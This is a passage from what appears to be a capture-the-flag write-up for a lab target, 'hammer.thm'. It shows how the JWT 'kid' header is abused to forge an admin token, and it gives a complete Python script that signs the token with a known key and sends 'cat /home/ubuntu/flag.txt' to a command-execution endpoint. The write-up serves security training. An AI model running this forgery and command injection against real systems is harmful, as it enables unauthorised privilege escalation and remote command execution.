# Retrieving the flag

...



### Exploiting the JWT `kid` header value

Upon analysis of the retrieved JWT token value ([http://jwt.io/](http://jwt.io/)), I noticed that the `kid` field present in the headers. Moreover, I noticed the `role` field in the payload, which controls the user role. The goal will be to change this value to a higher privilege user such as `admin`.

Based on the OWASP WSTG testing guide ([https://github.com/OWASP/wstg/blob/master/document/4-Web\_Application\_Security\_Testing/06-Session\_Management\_Testing/10-Testing\_JSON\_Web\_Tokens.md](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)), I decided to test the JWT based vulnerabilities.

1. &#x20;

```
        # token = self.s.cookies.get('token')

        # token = token[:-1] # jwt not vuln to malformed singature
        # token = token.rsplit('.', 1)[0] # jwt not vuln to missing signature

        # jwt not vuln to 'alg': 'none', 'alg': 'NoNe'
        # token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoiL3Zhci93d3cvbXlrZXkua2V5In0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQ4NzExMTgyLCJleHAiOjE3NDg3MTQ3ODIsImRhdGEiOnsidXNlcl9pZCI6MiwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19'+'.' + token.split('.')[
        #     2]
```

**Python script:**

```python
import requests
import jwt

class JWT_KID_EXPLOIT():
    s = requests.Session()
    PORT = 1337
    email = 'tester@hammer.thm'
    password = '1'

    def __init__(self, IP):
        self.IP = IP
        self.URL = f'http://{IP}:{self.PORT}'

    def login(self):
        self.s.post(f'{self.URL}/index.php',
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    data={'email': self.email,
                          'password': self.password})

    def start(self):
        # login
        self.login()

        key = '56058354efb3daa97ebab00fabd7a7d7'
        payload = {
            "iss": "http://hammer.thm",
            "aud": "http://hammer.thm",
            "iat": 1748754378,
            "exp": 1749757978,
            "data": {
                "user_id": 1,
                "email": "tester@hammer.thm",
                "role": "admin"
            }
        }
        headers = {
            "typ": "JWT",
            "alg": "HS256",
            "kid": "188ade1.key"  # changed from '/var/html/mykey.key' -> '188ade1.key'
        }

        token = jwt.encode(payload, key, algorithm='HS256', headers=headers)
        command = 'cat /home/ubuntu/flag.txt'  # command to read flag

        print(f'[INFO] token={token}')

        res = self.s.post(f'{self.URL}/execute_command.php',
                          headers={
                              'Content-Type': 'application/json', 'Authorization': f'Bearer {token}'},
                          json={
                              'command': command
        })

        print(f'[INFO] {res.status_code}')
        print(f'[INFO] {res.text}')


IP = input('[!] Enter the target IP address: ')

jwt_exploit = JWT_KID_EXPLOIT(IP)
jwt_exploit.start()

```
